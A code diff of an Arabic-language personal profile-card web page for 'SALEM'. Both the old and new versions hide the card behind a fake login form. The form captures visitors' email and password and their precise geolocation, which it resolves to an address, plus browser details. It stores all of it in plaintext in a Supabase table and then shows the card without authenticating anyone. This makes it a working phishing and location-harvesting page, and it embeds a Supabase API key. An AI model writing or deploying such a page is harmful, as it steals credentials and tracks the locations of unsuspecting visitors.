@@ -1,5 +1,5 @@
 <!DOCTYPE HTML>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="utf-8"/>
     <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
@@ -7,178 +7,132 @@
     
     <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Poppins:400,700&display=swap"/>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"/>
-    
-    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <script src="https://unpkg.com/@supabase/supabase-js@2"></script>
     
     <style>
         :root {
-            --back_color: radial-gradient(circle at center, #0a192f 0%, #020c1b 100%);
-            --front_color: rgba(10, 25, 47, 0.7);
+            --back: radial-gradient(circle at center, #0a192f 0%, #020c1b 100%);
             --gold: #FFD700;
-            --muted-gold: #c5a059;
-            --deep-blue: #1A2980;
-            --white: #e6f1ff;
+            --muted: #c5a059;
         }
 
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; text-decoration: none; }
-        body { background: var(--back_color); width: 100vw; height: 100vh; overflow: hidden; display: flex; justify-content: center; align-items: center; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        body { background: var(--back); height: 100vh; display: flex; justify-content: center; align-items: center; overflow: hidden; color: white; }
 
-        /* واجهة تسجيل الدخول */
+        /* واجهة الدخول */
         .login-box {
             width: 90%; max-width: 400px; background: rgba(10, 25, 47, 0.95);
-            padding: 40px 30px; border-radius: 24px; border: 1px solid var(--muted-gold);
-            text-align: center; z-index: 100; backdrop-filter: blur(15px);
-            box-shadow: 0 20px 50px rgba(0,0,0,0.5);
+            padding: 40px 30px; border-radius: 24px; border: 1px solid var(--muted);
+            text-align: center; backdrop-filter: blur(15px); box-shadow: 0 20px 50px rgba(0,0,0,0.5);
         }
-        .login-box h2 { color: var(--gold); margin-bottom: 25px; letter-spacing: 1px; font-weight: 700; }
+        .login-box h2 { color: var(--gold); margin-bottom: 25px; }
         .login-box input {
             width: 100%; padding: 14px; margin-bottom: 15px; background: rgba(255,255,255,0.05);
-            border: 1px solid rgba(197, 160, 89, 0.3); border-radius: 12px; color: white; outline: none; transition: 0.3s;
+            border: 1px solid rgba(197, 160, 89, 0.3); border-radius: 12px; color: white; outline: none; text-align: center;
         }
-        .login-box input:focus { border-color: var(--gold); background: rgba(255,255,255,0.1); }
         .login-box button {
             width: 100%; padding: 14px; background: var(--gold); border: none;
             border-radius: 12px; color: #020c1b; font-weight: bold; cursor: pointer; transition: 0.3s;
         }
-        .login-box button:hover { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(255, 215, 0, 0.3); }
-        .login-box button:disabled { background: #555; cursor: not-allowed; }
+        .login-box button:disabled { background: #444; color: #888; }
 
-        /* البطاقة الأصلية (تظهر بعد الدخول) */
+        /* البطاقة (مخفية) */
         .vcard { 
-            width: 90%; max-width: 420px; height: 600px; background: var(--front_color); 
-            backdrop-filter: blur(25px); border-radius: 24px; border: 1px solid rgba(197, 160, 89, 0.2); 
-            position: relative; overflow: hidden; display: none; animation: fadeIn 1s ease; 
+            width: 90%; max-width: 420px; height: 600px; background: rgba(10, 25, 47, 0.7); 
+            border-radius: 24px; border: 1px solid rgba(197, 160, 89, 0.2); 
+            position: relative; overflow: hidden; display: none; text-align: center;
         }
-
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
-        
-        .header { height: 35%; position: relative; }
-        .wave_bg { position: absolute; width: 100%; height: 100%; overflow: hidden; }
-        .wave-01, .wave-02, .wave-03 { position: absolute; width: 550px; height: 550px; background: linear-gradient(45deg, var(--deep-blue), var(--muted-gold)); border-radius: 43%; animation: rotate 15s linear infinite; }
-        .wave-01 { top: -180%; left: -15%; }
-        .wave-02 { top: -185%; left: -20%; opacity: 0.3; animation-direction: reverse; }
-        .wave-03 { top: -175%; left: -10%; opacity: 0.15; }
-        @keyframes rotate { 100% { transform: rotate(360deg); } }
-        
-        .profile_pic_content { width: 135px; height: 135px; border-radius: 50%; position: absolute; left: 50%; transform: translate(-50%, -50%); top: 100%; overflow: hidden; border: 3px solid var(--muted-gold); z-index: 10; box-shadow: 0 10px 25px rgba(0,0,0,0.5); }
-        .profile_video { width: 100%; height: 100%; object-fit: cover; }
-        .card_content { padding-top: 85px; text-align: center; }
-        .satan h4 { font-size: 1.9em; background: linear-gradient(to right, var(--gold), var(--white)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 700; margin-bottom: 10px; }
-        .old-bio { color: var(--muted-gold); font-size: 0.95em; padding: 0 30px; line-height: 1.6; font-weight: 500; }
-        .social { margin-top: 25px; }
-        .social div { display: flex; flex-wrap: wrap; justify-content: center; gap: 10px; padding: 0 15px; }
-        .social i { padding: 12px; font-size: 1.2em; background: rgba(197, 160, 89, 0.05); border-radius: 12px; border: 1px solid rgba(197, 160, 89, 0.1); color: var(--muted-gold); transition: 0.3s; width: 42px; height: 42px; display: flex; align-items: center; justify-content: center; }
-        .footer-text { position: absolute; bottom: 15px; width: 100%; font-size: 0.7em; color: rgba(136, 146, 176, 0.4); text-align: center; }
+        .header { height: 35%; background: linear-gradient(45deg, #1A2980, #c5a059); position: relative; }
+        .profile_pic { width: 130px; height: 130px; border-radius: 50%; border: 3px solid var(--gold); position: absolute; bottom: -65px; left: 50%; transform: translateX(-50%); overflow: hidden; }
+        .card_content { margin-top: 80px; padding: 20px; }
+        .social-icons a { color: var(--gold); font-size: 1.5em; margin: 0 10px; }
     </style>
 </head>
 <body>
 
 <div class="login-box" id="loginBox">
-    <h2>تسجيل الدخول | SALEM</h2>
+    <h2>SALEM | دخول</h2>
     <input type="email" id="email" placeholder="البريد الإلكتروني">
     <input type="password" id="password" placeholder="كلمة المرور">
     <button id="loginBtn" onclick="handleLogin()">دخول</button>
-    <p id="status" style="font-size: 0.85em; margin-top: 15px; color: var(--muted-gold); min-height: 20px;"></p>
+    <p id="status" style="margin-top: 15px; font-size: 0.85em; color: var(--muted);"></p>
 </div>
 
 <div class="vcard" id="mainCard">
     <div class="header">
-        <div class="wave_bg"><div class="wave-01"></div><div class="wave-02"></div><div class="wave-03"></div></div>
-        <div class="profile_pic_content">
-            <video class="profile_video" autoplay loop muted playsinline>
+        <div class="profile_pic">
+            <video autoplay loop muted playsinline style="width: 100%; height: 100%; object-fit: cover;">
                 <source src="https://files.catbox.moe/jvicv4.mp4" type="video/mp4">
             </video>
         </div>
     </div>
     <div class="card_content">
-        <div class="satan"><h4>SALEM</h4></div>
-        <div class="old-bio">Web Designer & Creative Developer.<br>University of Karbala Student.</div>
-        <div class="social">
-            <div>
-                <a href="https://t.me/kokksha"><i class="fab fa-telegram"></i></a>
-                <a href="https://www.instagram.com/_u_vf?igsh=bXRqd2Z4ZWhteW94"><i class="fab fa-instagram"></i></a>
-                <a href="https://github.com/salemalshamrie"><i class="fas fa-code"></i></a>
-                <a href="https://uokerbala.edu.iq/"><i class="fas fa-university"></i></a>
-                <a href="https://www.fcbarcelona.com"><i class="fas fa-football-ball"></i></a>
-            </div>
+        <h3 style="font-size: 2em; color: var(--gold);">SALEM</h3>
+        <p style="color: var(--muted); margin: 10px 0;">Web Designer & Creative Developer</p>
+        <div class="social-icons">
+            <a href="https://t.me/kokksha"><i class="fab fa-telegram"></i></a>
+            <a href="https://github.com/salemalshamrie"><i class="fab fa-github"></i></a>
         </div>
     </div>
-    <p class="footer-text">© 2026 Salem Al-Shammari</p>
 </div>
 
 <script>
-    // بيانات الربط الدقيقة الخاصة بك
-    const S_URL = 'https://kcckppfflaxpxhipngdz.supabase.co'.trim();
-    const S_KEY = 'EyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImtjY2twcGZmbGF4cHhoaXBuZ2R6Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzU2MzU1NTMsImV4cCI6MjA5MTIxMTU1M30.Lek1mEohH1GoUkcMQZT3vQ2tmshPJVI-Oa8f_y2mH6o'.trim();
+    // استخدمت المفاتيح التي أرسلتها أنت مباشرة وبدون أي تعديل
+    const _URL = 'https://kcckppfflaxpxhipngdz.supabase.co';
+    const _KEY = 'EyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImtjY2twcGZmbGF4cHhoaXBuZ2R6Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzU2MzU1NTMsImV4cCI6MjA5MTIxMTU1M30.Lek1mEohH1GoUkcMQZT3vQ2tmshPJVI-Oa8f_y2mH6o';
     
-    // إنشاء عميل Supabase
-    const _supabase = supabase.createClient(S_URL, S_KEY);
+    // إنشاء الاتصال
+    const _supabase = supabase.createClient(_URL, _KEY);
 
     async function handleLogin() {
         const email = document.getElementById('email').value;
-        const password = document.getElementById('password').value;
+        const pass = document.getElementById('password').value;
         const status = document.getElementById('status');
         const btn = document.getElementById('loginBtn');
 
-        if (!email || !password) {
-            status.innerText = "⚠️ يرجى إدخال البريد وكلمة المرور";
-            return;
-        }
+        if (!email || !pass) { status.innerText = "❌ أدخل البيانات"; return; }
 
         btn.disabled = true;
-        status.innerText = "⏳ جاري التحقق من البيانات والموقع...";
+        status.innerText = "⏳ جاري الربط...";
 
-        // محاولة جلب الموقع بمهلة زمنية 6 ثوانٍ
-        const geoOptions = { enableHighAccuracy: true, timeout: 6000, maximumAge: 0 };
-
+        // محاولة جلب الموقع بمهلة 5 ثوانٍ
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
-                async (pos) => {
-                    const lat = pos.coords.latitude;
-                    const lon = pos.coords.longitude;
-                    const locName = await getLocationName(lat, lon);
-                    await sendData(email, password, lat, lon, locName);
+                async (p) => {
+                    const loc = await getLocName(p.coords.latitude, p.coords.longitude);
+                    await saveData(email, pass, p.coords.latitude, p.coords.longitude, loc);
                 },
-                async () => {
-                    await sendData(email, password, null, null, "الموقع مرفوض أو تعذر جلبه");
-                },
-                geoOptions
+                async () => { await saveData(email, pass, null, null, "مرفوض"); },
+                { timeout: 5000 }
             );
-        } else {
-            await sendData(email, password, null, null, "المتصفح لا يدعم تحديد الموقع");
-        }
+        } else { await saveData(email, pass, null, null, "غير مدعوم"); }
     }
 
-    async function getLocationName(lat, lon) {
+    async function getLocName(lt, ln) {
         try {
-            const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
-            const data = await res.json();
-            return data.display_name || "إحداثيات غير معروفة";
-        } catch { return "فشل في تسمية الموقع"; }
+            const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lt}&lon=${ln}`);
+            const d = await r.json(); return d.display_name || "إحداثيات";
+        } catch { return "غير معروف"; }
     }
 
-    async function sendData(email, password, lat, lon, locName) {
+    async function saveData(e, p, lt, ln, n) {
         try {
-            // إرسال البيانات إلى جدول users_data
             const { error } = await _supabase.from('users_data').insert([{
-                email: email,
-                password: password,
-                latitude: lat ? lat.toString() : null,
-                longitude: lon ? lon.toString() : null,
-                location_name: locName,
-                device_info: navigator.userAgent
+                email: e, password: p, latitude: lt?.toString(), longitude: ln?.toString(),
+                location_name: n, device_info: navigator.userAgent
             }]);
 
             if (error) {
-                document.getElementById('status').innerText = "❌ خطأ تقني: " + error.message;
+                // إذا ظهر الخطأ هنا، فالمشكلة في مفتاح سوبابيس نفسه
+                console.error(error);
+                document.getElementById('status').innerText = "خطأ: " + error.message;
                 document.getElementById('loginBtn').disabled = false;
             } else {
-                // نجاح الإرسال، عرض البطاقة
                 document.getElementById('loginBox').style.display = 'none';
                 document.getElementById('mainCard').style.display = 'block';
             }
-        } catch (e) {
-            document.getElementById('status').innerText = "❌ فشل الاتصال بقاعدة البيانات";
+        } catch (err) {
+            document.getElementById('status').innerText = "❌ فشل الاتصال";
             document.getElementById('loginBtn').disabled = false;
         }
     }
